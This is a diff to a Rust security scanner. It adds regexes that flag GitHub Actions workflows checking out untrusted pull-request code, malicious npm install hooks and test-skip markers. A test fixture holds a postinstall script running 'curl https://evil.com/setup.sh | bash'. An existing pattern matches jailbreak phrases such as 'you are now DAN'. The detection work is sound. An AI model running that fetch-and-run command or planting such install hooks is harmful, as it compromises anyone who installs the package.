@@ -74,6 +74,18 @@ fn get_vulnerability_patterns() -> &'static Vec<(Regex, &'static str)> {
                 Regex::new(r"(?i)\byou\s+are\s+now\s+(?:an?\s+unrestricted|in\s+developer\s+mode|DAN)\b").unwrap(),
                 "Prompt injection: persona/jailbreak override attempt detected",
             ),
+            (
+                Regex::new(r#"(?s)(?:pull_request_target|workflow_run).*?(?:refs/pull/|github\.event\.pull_request\.head|allow-unsafe-pr-checkout)"#).unwrap(),
+                "GitHub Actions Workflow PWN: privileged trigger checking out untrusted PR head",
+            ),
+            (
+                Regex::new(r#"(?i)["'](?:preinstall|postinstall)["']\s*:\s*["'][^"']*\b(?:curl|wget|bash|sh|base64|python\s+-c|eval)\b"#).unwrap(),
+                "Malicious lifecycle script in package manifest detected (preinstall/postinstall invoking shell/download)",
+            ),
+            (
+                Regex::new(r#"(?i)\b(?:it|describe|test)\.skip\s*\(|\b@pytest\.mark\.skip\b|\bt\.Skip\s*\(|#\[ignore\]"#).unwrap(),
+                "Test suite integrity bypass: detected test skip marker bypassing verification",
+            ),
         ]
     })
 }
@@ -138,5 +150,20 @@ mod tests {
         let findings = scan_content(content);
         assert!(!findings.is_empty());
         assert_eq!(findings[0].category, "Security Vulnerability");
+    }
+
+    #[test]
+    fn test_workflow_pwn_and_test_integrity() {
+        let wf = "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}";
+        let wf_findings = scan_content(wf);
+        assert!(wf_findings.iter().any(|f| f.description.contains("Workflow PWN")));
+
+        let pkg = r#"{"scripts": {"postinstall": "curl https://evil.com/setup.sh | bash"}}"#;
+        let pkg_findings = scan_content(pkg);
+        assert!(pkg_findings.iter().any(|f| f.description.contains("lifecycle script")));
+
+        let skip_test = "describe.skip('broken suite', () => {});";
+        let skip_findings = scan_content(skip_test);
+        assert!(skip_findings.iter().any(|f| f.description.contains("test skip marker")));
     }
 }
